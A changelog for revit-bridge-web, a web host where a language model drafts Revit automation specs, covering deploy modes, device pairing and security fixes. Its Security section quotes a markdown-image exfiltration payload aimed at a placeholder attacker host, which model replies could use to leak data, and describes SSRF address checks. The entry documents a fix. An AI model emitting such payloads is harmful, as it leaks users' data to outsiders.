# Changelog

All notable changes to `revit-bridge-web` are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

Upgrading: **the host now starts as a local host** (`DEPLOY_MODE=local`, the new default): this
machine only, no relay, no pairing, no admin password. A deployment that other machines reach must
set `DEPLOY_MODE=cloud` in its `.env` before it is upgraded, and keep `ADMIN_PASSWORD` (a cloud
host now refuses to start without it). That includes a host published on loopback behind a reverse
proxy or a tunnel on the same machine, which the loopback check cannot see. Such a host fails
closed if it is upgraded without `DEPLOY_MODE=cloud`: with `ADMIN_PASSWORD` (or `CORS_ORIGINS`) in
its `.env` a local host refuses to start, and without them it refuses every request that came
through a proxy (403 `local_mode_no_proxy`) or names its public host (403 `local_mode_host`). See
*Added* and *Changed* (deploy modes).

The host needs `revit-bridge>=0.8,<0.9` (`uv sync`, or rebuild the image). The system
prompt changes (below); questions in the `spec` event may carry `kind` and `blocks`, and a value
`reconcile` cannot find now also comes as a question. Event names and shapes are unchanged.
Set `ADMIN_PASSWORD` to keep changing capability packs from the web UI (see *Security*). If your
`.env` was copied from an older `.env.example`, delete its `FORWARDED_ALLOW_IPS=127.0.0.1` line
when the port is published on loopback behind a proxy on the Docker host (see *Fixed*).

### Security

- **Changing capability packs needs the admin password.** This changes who may call three
  routes: `PUT /api/v1/bridge/tools/{name}`, `DELETE /api/v1/bridge/tools/{name}` and
  `POST /api/v1/bridge/solidify` now require `X-Admin-Token` (the same check as skill edits,
  `/api/logs` and the device list) and answer 403 `admin_required` without the right one, 503
  `admin_disabled` when `ADMIN_PASSWORD` is unset. Before, any visitor could create, edit or
  delete a pack - the built-in ones included - and a pack's code runs in a designer's Revit
  once they confirm its card. Listing, reading, choices, missing-params, confirming and running
  packs are unchanged. In `docs/api-v1.json` these three operations change (the header, 503,
  the 403 text). The Capabilities page hides *Edit pack* and *Delete*, and the task page's
  *Save as pack* stays off, until the admin password is entered on the Connect page; a host
  without `ADMIN_PASSWORD` cannot change packs through the web UI. The model's tools never
  could (it has no writing tool; a test keeps it so).
- **Three more routes gained a documented status:** `POST /api/v1/bridge/devices/pair`,
  `POST /api/v1/bridge/devices/redeem` and `DELETE /api/v1/bridge/devices/{device_id}` now
  declare 503 `device_store_unavailable` (see *Fixed*). That 503 is the only change to those
  three operations in `docs/api-v1.json`; with the three pack routes above they are the only
  operations whose contract this round of fixes changes.
- The server's model key no longer leaves for a visitor's endpoint. A request with only
  `X-LLM-Base-Url` used to go there with `LLM_API_KEY` in its `Authorization` header. The key
  now only ever goes to `LLM_BASE_URL`: a request that names its own base URL must send
  `X-LLM-Key` too (400 otherwise, nothing sent); a visitor's key or model name alone still uses
  the server's endpoint, as documented. `/config.json` reports `serverModel` only when
  `LLM_BASE_URL`, `LLM_MODEL` and `LLM_API_KEY` are all set.
- A browser-supplied model endpoint must be on a public address: a literal loopback, private,
  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6, IPv4 inside 6to4,
  Teredo or NAT64, and numeric short forms such as `127.1` or `2130706433` included),
  `localhost` and names under it, or a name that resolves to one, is refused with 400 before
  anything is sent. The host checked is the one httpx connects to, and a URL httpx would refuse
  (a control character, a space in the host) is a 400 too. `LLM_ALLOW_HTTP=1` lifts the
  address check along with the https rule (a model on the operator's own network);
  `LLM_BASE_URL` is never checked. The name is resolved once per request, which does not stop
  DNS rebinding, so a public host should also restrict egress. A redirect from a model endpoint
  is never followed (it is an error).
- Markdown from the model (task page) and from skill files (Capabilities page) renders no
  images: a reply with `![x](https://attacker/?d=...)` made the browser fetch that address.
  An image shows as its alt text; links open in a new tab with `rel="noopener noreferrer"`.

### Added

- Deploy modes: `DEPLOY_MODE=local` (default) or `cloud`. A local host serves this machine only:
  it refuses to start when other machines could reach it (`HOST` not loopback; in the image, where
  the server listens on `0.0.0.0`, a `BIND_ADDRESS` not loopback or not passed in), and it has no
  relay, no pairing and no admin password. A cloud host is the host as it was, and refuses to start
  without `ADMIN_PASSWORD`. Both refusals print the reason and exit 2. `/config.json` reports
  `features.mode`. A local host also refuses to start with `ADMIN_PASSWORD` set (a cloud
  deployment missing `DEPLOY_MODE=cloud` fails closed instead of running without a password) or
  with `CORS_ORIGINS` set; `MAX_DEVICES` and `PUBLIC_WS_BASE` given to it are not an error, one
  startup log line names each as unused.
- The request guard of a local host (`backend/localguard.py`), in front of every path (API, static
  files, `/config.json`, `/health`, WebSocket upgrades): 403 `{"error": "local_mode_no_proxy"}` for a
  request carrying `Forwarded`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Forwarded-Proto`,
  `X-Real-IP` or `CF-Connecting-IP`; 403 `local_mode_host` for a `Host` other than `127.0.0.1`,
  `localhost` or `[::1]` with any port (plus the loopback address configured as `HOST` /
  `BIND_ADDRESS` when it is another one), the guard against DNS rebinding, and - outside a container -
  for a peer address that is not loopback (a server started as `uvicorn backend.main:app --host
  0.0.0.0` is covered too); 403 `local_mode_origin` for a POST, PUT, PATCH or DELETE whose `Origin`
  is not `http://` plus the request's `Host`. Routes without a body (`DELETE /tools/{name}`, `DELETE
  /api/skills/{id}`, `POST /trigger-selection`...) would otherwise take a cross-site form post;
  routes with a JSON body already refuse `text/plain` and form data with 422. A cloud host has no
  such guard: forwarding headers and public host names are normal behind its proxy. Known limit:
  the guard cannot tell a request relayed by a forward proxy running on the same machine from a
  direct browser (loopback peer, rewritten `Host`, no forwarding headers), so a local proxy that
  accepts connections from other machines exposes the host to them; keep such a proxy bound to
  loopback or do not run the host beside it.
- `npm run dev`: the Vite proxy presents its own pages (`http://localhost:5173`) with the target's
  origin, so the dev page can still make changes on a local host; any other `Origin` passes through
  unchanged and is refused.
- `uv run revit-bridge-web`: the API and the built frontend on `127.0.0.1:7860` without Docker
  (`--host` / `--port` override `HOST` / `PORT` and go through the same check). `pyproject.toml`
  now builds the project (hatchling) so `uv sync` installs it editable with this script; `uv.lock`
  changes only the project's own source line. `python -m backend.main` (the image) is unchanged;
  importing `backend.main` no longer builds the app (`uvicorn backend.main:app` still finds one).
- `get_guidance`, the package's lessons for writing Revit code, as a model tool: the same
  arguments (`mode`, `stage`, `skill_categories`, `revit_categories`, `symbols`, `errors`,
  `exceptions`, `revit_version`, `ids`, `seen_hashes`) and JSON reply as the MCP tool, computed in
  process by `revit_bridge.guidance` on the framework lessons in the wheel plus the company,
  project and personal layers the environment names (`REVIT_BRIDGE_GUIDANCE_COMPANY` /
  `_PROJECT`, `REVIT_BRIDGE_DATA_DIR/guidance`). Read-only; bad arguments and an invalid framework
  layer are results (`invalid_args`, `guidance_invalid`). The description is the MCP tool's
  docstring word for word followed by one host note: "This host has no check_code; use stage=fix
  with the symbols you suspect." A test checks that the description starts with the installed MCP
  tool's docstring and that the parameter names match its signature.
- The task page shows each question's `kind` as a badge (*designer*, *model fact*, *technical*)
  with what it `blocks` in the tooltip. Display only: *Confirm* still follows `reconcile.ready`.
- Paired devices replace the fixed slots: `POST /api/v1/bridge/devices/pair`,
  `POST /devices/redeem` (the add-in, no headers), `GET /devices/{id}`,
  `DELETE /devices/{id}` (revokes and closes the socket), `GET /devices` (admin).
  The relay is keyed by device id, `/ws/{device_id}` requires the add-in's auth
  message within ten seconds and `MAX_DEVICES` (20) caps concurrent connections.
  All of the credential logic is the package's `DeviceStore`: only hashes are
  stored, in `REVIT_BRIDGE_DATA_DIR/auth/devices.json`.
- Every confirmation and every ledger line carries a `scope` - the device it
  belongs to, or `"local"` for the add-in on this machine. A token confirmed for
  one device is refused on another (`mismatch`), `GET /evidence` shows only that
  device's records and `POST /evidence/{id}/validate` answers 404
  `unknown_evidence` for another device's record.
- `POST /execute` asks the designer on the device before running ad-hoc code (the
  package sends `confirm` with the spec card); a No is `success: false,
  error: "declined_on_device"` with the token consumed and a ledger line. A pack
  run is not asked about.
- The Connect page pairs a Revit instead of picking a numbered slot: **Pair a Revit** shows the
  pairing code with its countdown, the install command that carries it and the settings-window
  alternative, then waits (every three seconds, up to ten minutes) for the add-in to redeem it and
  come online. *My devices* lists the devices this browser tab holds keys for - label, online, last
  seen, requests, *Revoke* - and selecting one is what every other page then talks to; the local
  add-in over TCP stays as the other choice. With the admin password, a list of every device on the
  host with the same *Revoke*.

- The host loop: `POST /api/chat` runs the model with the package's read-only tools
  (`get_project_snapshot`, `query`, `list_tools`, `get_tool_choices`, `missing_params`,
  `reconcile`) and `propose_spec` (OpenAI-compatible function calling in `backend/llm.py`).
  `propose_spec` validates and reconciles the draft and pushes `event: spec`
  `{spec, card, errors, reconcile}` to the page; the model gets `{accepted, errors,
  reconcile}`. The model has no `confirm_spec`, `run_tool` or `execute_code`. The page
  reports an execution back with `{execution, session_id}`: the turn starts with
  `event: execution` and the model reports faithfully. `bridge: false` is the comparison
  mode: one plain prompt, no tools, no skills.
- The system prompt is the package's `host_instructions()` plus the enabled skills (which of the
  wheel's are on by default: see *Changed*). The host's own `HOST_INSTRUCTIONS` and the pack
  index in the prompt are gone.
- Sessions keep the model's message history (with tool calls), the last snapshot
  fingerprint, the last proposed spec and the last reported `evidence_id`; never a token.
  A tool result is kept in the session up to 8 KB (head plus a one-line note), a
  `get_guidance` reply up to 16 KB, so the orient lessons (about 12.4 KB) reach later turns
  whole; the turn that produced a result still sends it to the model in full.
- `frontend/src/api/chat.ts`: `parseSseFrame()` and `chatEvents()` yield the host loop's
  events (`session`, `token`, `spec`, `execution`, `error`, `done`); the types are in
  `frontend/src/types/api.ts`.
- The task page is the demo sequence: the snapshot, the brief with the model's questions as
  clickable options, the side-by-side comparison with a `bridge: false` session, the spec card
  from the `spec` event (source and evidence per parameter, the readings as checkboxes,
  conflicts in red, *Confirm* only when the reconciliation is ready), the confirmed execution
  with the validator's checks and a prominent `validation_failed`, the tamper demo (one value
  changed under the same token is `confirmation_invalid`), the report back to the model and
  solidifying code that worked into a v1 pack. The confirmation token lives in the page's
  memory only - never `localStorage` or `sessionStorage`.
- An **Evidence** page: the ledger (`GET /evidence`) with one row per execution, every field of a
  record when it is expanded, and *Validate* (`POST /evidence/{id}/validate`) to re-run its
  assertion against the model as it is now.
- Web API v1 under `/api/v1/bridge`, every route a thin wrapper over `revit-bridge` 0.2:
  `GET /snapshot`, `POST /query`, `POST /tools/{name}/missing-params`,
  `POST /spec/reconcile`, `POST /spec/confirm` (issues the one-time token, channel
  `host_ui`), `GET /evidence`, `POST /evidence/{id}/validate`. The contract is exported
  to `docs/api-v1.json` (CI checks it).
- `tests/fake_revit.py`: a TCP stand-in for the add-in so every route is tested end to
  end without Revit.
- `POST /spec/confirm` is rate limited per client address like `/api/chat`
  (`CHAT_RATE_LIMIT`, its own counter): 429 `{error: rate_limited}`.
- `.env.example` lists, commented out, the other variables the host and `revit-bridge` 0.6.0
  read: `REVIT_BRIDGE_CONFIRM_TTL`, `REVIT_BRIDGE_GUIDANCE_COMPANY` / `_PROJECT`,
  `REVIT_BRIDGE_CAPABILITIES_DIR` / `_EVIDENCE_DIR`, and `DATA_DIR` / `HOST` (both pinned by
  `docker-compose.yml`).
- CI's image job also runs the documented smoke: `docker compose up -d --build` with
  `.env.example` as `.env`, then `/health`, so the env file, the `./data` bind mount and the
  entrypoint's drop to `appuser` are exercised.

### Changed

- On a local host: the add-in socket and the device routes (`/api/v1/bridge/ws/{device_id}`,
  `/devices`, `/devices/pair`, `/devices/redeem`, `/devices/{device_id}`) are not mounted and answer
  404 `{"error": "cloud_mode_only", "message": ...}` - the socket before the upgrade; `X-Device-Id`
  / `X-Device-Key` (and the 0.1 slot headers) are not read, so every request, the chat's tools
  included, drives the add-in on this machine and its confirmations and evidence are `local`; the
  admin checks of pack changes, skill writes and `/api/logs` pass without a token
  (`/api/logs/verify` answers `{valid: true}`); `/config.json` has `admin: false`, `maxDevices: 0`
  and an empty `wsBase`; `GET /slots` is `{max_devices: 0, connected: 0}`; `GET /service-health`
  has `remote_relay_ready: false` and `websocket_endpoint: null`; `GET /revit-health` no longer adds
  "0 paired device(s) connected" to its detail. A cloud host answers all of these as before.
- The Connect page of a local host shows the local add-in's check and the model settings only - no
  pairing, no device lists, no admin password field (the components render on a cloud host) - and
  no request carries a device header or the admin token there; pack edit and delete, *Save as
  pack* and the skill editor work without a password. A cloud host's pages are unchanged. A
  `config.json` without `features.mode` (an older static one) is read as a cloud host;
  `frontend/public/config.example.json` says `"mode": "cloud"` and `"admin": true`.
- `docker-compose.yml` sets `DEPLOY_MODE` (default `local`) and passes `BIND_ADDRESS` into the
  container with the same default as the published port; `MAX_DEVICES` is passed empty unless set
  (empty means 20 on a cloud host), so a local host does not report it as unused. The image sets
  `REVIT_BRIDGE_WEB_CONTAINER=1`. Running the image with `docker run` in local mode needs
  `-p 127.0.0.1:7860:7860 -e BIND_ADDRESS=127.0.0.1` (CI's image smoke does that, and checks both
  refusals).
- `docs/api-v1.json` is exported from a cloud host (`DEPLOY_MODE=cloud ADMIN_PASSWORD=...` before
  the export command; CI does the same) and is unchanged: every route is still there.
- Requires `revit-bridge>=0.8,<0.9` (0.8.2 in `uv.lock`; the image installs it from PyPI). From
  0.6.1 to 0.8.2 nothing the host imports changed its name, signature or reply, and no route,
  tool, pack, TaskSpec or gate changed: `docs/api-v1.json` is the same export, `GET /tools` lists
  the same eight packs, and the model's tool definitions and `get_guidance` replies are the same
  byte for byte (the MCP tool's docstring did not change). The tools 0.7 added to the MCP server
  (`dry_run_code`, `test_addin_command`, `zoom_view`, `capture_view`) are not the model's here.
  What the model and the pages now see: the prompt's first line names revit-bridge 0.8, and
  `revit-core` (on by default) has a new section, "Keep Revit interactive", so with the bridge the
  prompt is 6,007 bytes instead of 5,455. The skill list has 44 entries instead of 40: the journal
  skill `revit-journal-analysis` and its three references, all off. The package's JSON stores this
  host writes through it (`usage.json`, `auth/devices.json`) no longer lose an update or end up
  corrupt when two writers meet (0.8.0). When the host and an MCP server share one
  `REVIT_BRIDGE_DATA_DIR`, the Evidence page can also list the server's new ledger lines (`action`
  `dry_run`, `addin_test`, `zoom_view` or `capture_view`; no pack, no *Validate*).
- Before that, in this cycle: `revit-bridge>=0.6,<0.7` (0.6.1). 0.6.1 is the first release whose device store raises when `devices.json` cannot be read, which the pair, redeem and delete-device routes answer with 503. From
  0.4.0 to 0.6.0 no route, tool, pack, TaskSpec or gate changed: `docs/api-v1.json` is the same
  export and `GET /tools` lists the same eight packs. What the pages and the model now see: an
  execution reads the levels once more after the document probe (a pack with preconditions takes
  them from its snapshot), and its ledger line's `document` carries `fingerprint` (the snapshot
  fingerprint; null with a `document: fingerprint skipped` warning when that read fails); a failed
  run whose error names .NET exception types has a `hint` that points at
  `get_guidance(stage="fix", exceptions=[...])`; a value missing from a truncated candidate list is
  a `model_fact` question; `get_guidance` has four more lessons; the prompt's first line names
  revit-bridge 0.6 (still 5,455 bytes). The skill list has 40 entries instead of 29: the phase
  skills `revit-task-brief`, `revit-addin-test` and `revit-addin-release` with their references,
  and `revit-addin-dev`'s `coding-rules`, all off.
- The system prompt no longer carries every `SKILL.md` in the wheel: of 0.4's three skills only
  `revit-core` is on by default, followed by one line that sends the model to `get_guidance` for
  the lessons and names the other categories. The `revit-bridge` protocol is listed but off: it
  describes the MCP server's tool flow (`check_code`, `confirm_spec`, `execute_code`, the
  verification tools), and this host's protocol is the package's `host_instructions()`, which
  opens the prompt. `revit-addin-dev`, references and lessons are listed but off too. A file's
  own `enabled: true` still turns it on. With the bridge the prompt is 6,007 bytes (UTF-8, with
  revit-bridge 0.8.2; 5,455 with 0.6.1); with
  the `revit-bridge` protocol in it, it was 22,348 bytes, and concatenating every `SKILL.md` of
  0.4.0 would have made it 28,918 bytes (13,837 with 0.3.0). A mounted `SKILLS_DIR` is
  unchanged: every file on unless it says otherwise.
  `bridge: false` is unchanged: 145 bytes, no skills, no tools.
- The browser identifies a Revit with `X-Device-Id` + `X-Device-Key` instead of `X-Slot-Id` +
  `X-Slot-Token`; the device id and this browser's key live in `sessionStorage` with the model
  settings, never in `localStorage`. `/config.json` carries `features.maxDevices`; `maxSlots` and
  `slotTokenRequired` are gone, and so is every slot-token field in the UI.

- `POST /tools/{name}/run` and `POST /execute` require the token from
  `POST /spec/confirm` and run through the package's `run_pack` / `run_code`
  (sandbox, preconditions, validator, evidence ledger with `host: "web"`); without a
  token they answer 400 `confirmation_required`, a tampered call is 200
  `confirmation_invalid`, a failed validation 200 `validation_failed`. The reply is the
  MCP `ExecutionResult` shape.
- Executions from the UI go through the gate: the Task page and the Capabilities page both
  build a TaskSpec, confirm it (`POST /spec/confirm`) and run it with the token. The 0.1 path
  (the model writes C# in the chat, the page posts it to `/execute`) is gone, with
  `frontend/src/utils/code.ts`.
- The Capabilities pack list shows the pack's version, validator and preconditions.
- `GET /tools` returns the MCP `list_tools` shape (`name, description, version,
  parameters, preconditions, validator, used`). `POST /solidify` takes v1 parameters
  and an optional `validator`.
- Status codes and error bodies across the bridge routes: 400 for a request the route
  refuses as such (`confirmation_required`, `invalid_category`, `unknown_kind`,
  `blocked`, `no_validator`), 422 for a body that parsed but is not valid
  (`invalid_args`, `invalid_spec`, `invalid_snapshot`, `invalid_pack`), 404 for what
  does not exist (`unknown_tool`, `unknown_evidence`), 503 `revit_unreachable` when no
  add-in answers (was 502), 200 `success: false` for refusals; bodies are
  `{error, message?, ...}` instead of FastAPI's `{detail}`. `docs/api-v1.json`
  declares those statuses per route as `ErrorBody`; FastAPI's own validation errors are
  `invalid_args` on the bridge routes only - `/api/chat`, `/api/skills` and `/api/logs`
  keep `{detail: [...]}`.

- Since `revit-bridge` 0.2.1 (the current requirement is the first entry of this list) the
  package ships eight built-in packs read in place from the wheel, keeps user packs and
  `usage.json` under its own data root, and no longer rewrites pack files to count executions.
- Capability packs come straight from the package's `ToolStore`: built-in packs are
  read from the wheel, user packs live under `REVIT_BRIDGE_DATA_DIR/capabilities`
  (`/app/data` in the container, the `./data` volume). Nothing is copied on first
  start any more; the entrypoint only makes the volume writable.
- Upgrading a 0.1 data volume: pack files without `schema_version` in the user pack
  directory (the copies 0.1 seeded, or packs solidified with 0.1) are moved to
  `capabilities/legacy-0.1/` at startup, one log line per file, nothing deleted, so the
  wheel's rewritten packs are not shadowed by their 0.1 copies.
- `GET /api/v1/bridge/tools` items carry the pack `version`.
- Built-in skills default to the plugin skills shipped in the `revit-bridge` wheel
  (`builtin:revit-bridge/SKILL` and its references); `SKILLS_DIR` is now an optional
  override instead of the only way to get them. The wheel's skills are listed and
  readable but disabled by default (a file's own `enabled: true` wins): `SKILL.md`
  expects the MCP tools this chat does not have yet and the references are read on
  demand, so a fresh install's system prompt is unchanged from 0.1. A mounted
  `SKILLS_DIR` is enabled by default as before.

### Fixed

- Behind the documented setup (port published on loopback, a reverse proxy on the Docker host)
  every visitor shared one address for the rate limits and the logs: requests reach the
  container from the Docker bridge gateway, whose `X-Forwarded-For` was not trusted, so the
  pairing redeem limit (10 a minute) applied to the whole host. The image now trusts
  `127.0.0.1,172.16.0.0/12` (`FORWARDED_ALLOW_IPS`; an explicit value still wins, and outside a
  container the default stays `127.0.0.1`). With `BIND_ADDRESS` not loopback, set
  `FORWARDED_ALLOW_IPS` to the proxy's address, or to `127.0.0.1` with no proxy.
- The container no longer turns "unhealthy" when `.env` sets `HTTP_PROXY` for model calls: the
  healthcheck bypasses proxies.
- A malformed `X-LLM-Base-Url` (`https://[::1`, a port out of range) is a 400, not a 500.
- `GET /%00` (a NUL byte in a path the SPA fallback looks up) serves the SPA instead of a 500,
  and an unknown `GET /api/...` is a JSON 404 `{error: "not_found", message}` instead of the
  SPA page with 200. Real routes, `/config.json`, `/health` and the build's files are unchanged.
- `CORS_ORIGINS="*"` no longer allows credentials (the middleware echoed any origin back with
  credentials allowed); an explicit origin list keeps them.
- `GET` and `DELETE /api/v1/bridge/devices/{id}` answer an unknown id with the same 403
  `invalid_device_key` as a wrong key, so a browser cannot probe which devices exist; with the
  admin password an unknown id is still 404. Every admin check compares `X-Admin-Token` in
  constant time (the device routes used `==`).
- Requests for one device no longer queue without bound behind a long one (a confirmation
  dialog holds a device up to three minutes): a request waits for its turn at most its own
  timeout and at most 16 wait at once, then fails as `revit_unreachable` (503) with nothing
  sent and no token consumed. Unauthenticated add-in sockets cannot pile up: an address with 20
  failed handshakes in a minute (wrong token, no auth message in time) or 64 sockets still
  waiting to authenticate is refused before the upgrade, so the close codes 4001/4002/4003 keep
  their meaning. Add-ins that authenticate never count, however often they reconnect.
- A device store that cannot be read for a moment (a later revit-bridge 0.6.x raises `OSError`
  after half a second instead of overwriting `devices.json`, before it writes anything):
  pairing, redeeming a code and revoking a device answer 503 `{error:
  "device_store_unavailable", message}` - nothing changed, the code is not consumed, try again
  - instead of an unhandled 500; the Connect page shows the message and keeps the label and
  the device for a retry (an admin revoke's message no longer vanishes when the list reloads).
  An add-in that connects meanwhile stays connected; only its last-seen time goes unrecorded.
  Before, the error closed the socket and left the device registered in the relay.
- Growth while the host runs: interaction logs older than 90 days are purged daily, not only at
  startup; at most 300 chat sessions are kept (the one idle the longest goes first); an
  `execution` report enters the session and the prompt with at most 16,384 characters of JSON
  (a longer `result` is cut to its head with a note, the verdict fields stay whole; the page
  still gets the whole report back), and only one over 4,194,304 characters is refused with
  422 `invalid_args`; one model call ends after 600 s even when the endpoint keeps trickling
  bytes.
- Skills: a very long name is cut to a 120-byte id when a skill is created instead of failing
  with 500 (a longer id already on disk still opens, changes and deletes; one the file system
  cannot hold is 404), a skill file is replaced whole or not at all (temporary file with the
  mode a plain write gives, then rename), and a file that is not UTF-8 reads as absent (404, as
  the list already skipped it) instead of a 500.
- A round that offers the model no tools (`bridge: false`, or the last round of a turn) no
  longer runs `tool_calls` the model returns anyway: they are logged (`backend.chat`) and
  dropped, and the round ends with the model's text, or an empty assistant message.
- Over a slot, a Revit that is gone or leaves mid-request is a transport failure
  (`ConnectionError`) like over TCP, so the package consumes no confirmation token and
  writes no ledger line for code that never reached Revit; only a reply that does not
  arrive in time is still `success: false, "Timeout ..."`.
- `POST /api/v1/bridge/solidify` and `PUT /api/v1/bridge/tools/{name}` answer
  `422 {"error": "invalid_pack", "problems": [...]}` when the package rejects the pack
  (an undeclared `{placeholder}` in the code, a malformed parameter, an unknown
  validator) instead of 500.
- `CLAUDE.md` gave the package constraint as `revit-bridge>=0.1.0`; it is `>=0.6,<0.7`.

### Removed

- `X-Slot-Id` / `X-Slot-Token` (an `X-Slot-*` header is now 422 `invalid_args`),
  `MAX_SLOTS`, `MCP_BRIDGE_REQUIRE_SLOT_TOKEN`, `MCP_BRIDGE_SLOT_TOKEN_*` (the host
  refuses to start when one is still set, naming `MAX_DEVICES` or the pairing flow),
  and the `./.secrets` mount in `docker-compose.yml`. Existing add-ins must be
  reinstalled once and paired.

- `GET/POST /unit`, `GET /project-units`, `POST /query-revit`: the snapshot's `units`
  and `POST /query` replace them (the Connect page reads units from the snapshot).
  `docs/api-v0.json` is replaced by `docs/api-v1.json`.
- `backend/capabilities.py` (the first-start copy of the packs into `DATA_DIR`).

## [0.1.0] - 2026-09-18

First standalone release of the demo host, split out of the former
`revit-api-rag` monorepo.

### Added

- FastAPI backend that only imports `revit_bridge`: `/api/v1/bridge/*` (capability
  packs, execution behind the sandbox review, model queries, health), the
  WebSocket slot relay for remote add-ins with pre-shared slot tokens, `/api/skills`,
  `/api/logs` (admin) and `/config.json`.
- Bring-your-own-model chat (`/api/chat`): one OpenAI-compatible streaming client;
  `X-LLM-Base-Url` / `X-LLM-Model` / `X-LLM-Key` headers take precedence over
  `LLM_BASE_URL` / `LLM_MODEL` / `LLM_API_KEY`; keys are never stored or logged;
  browser-supplied endpoints must be https unless `LLM_ALLOW_HTTP=1`.
- React SPA with three pages - Connect, Task, Capabilities - that reads its
  configuration from `/config.json` at startup; no build-time API address.
- Single-image `Dockerfile` (Node build + Python runtime, no vector store, no model
  SDK), `docker-compose.yml`, `.env.example`, entrypoint that copies slot token files
  and drops privileges.
- Capability packs are copied from the package into `DATA_DIR/capabilities` on first
  start so edits and solidified packs persist in the data volume.
- `docs/api-v0.json`: exported OpenAPI contract. Backend test suite (no Revit needed).

### Removed (compared with the monorepo server)

- RAG retrieval, code generation, intent classification and orchestration routes,
  Text2Revit, PromptBridge, TextStudio, the API explorer, Gradio, `config.yaml`
  and every `openai` / `google-genai` / `cohere` / `chromadb` dependency.
- `/api/settings` and `/api/config`: model settings are per-request headers now.

[0.1.0]: https://github.com/revitbridge/revit-bridge-web/releases/tag/v0.1.0
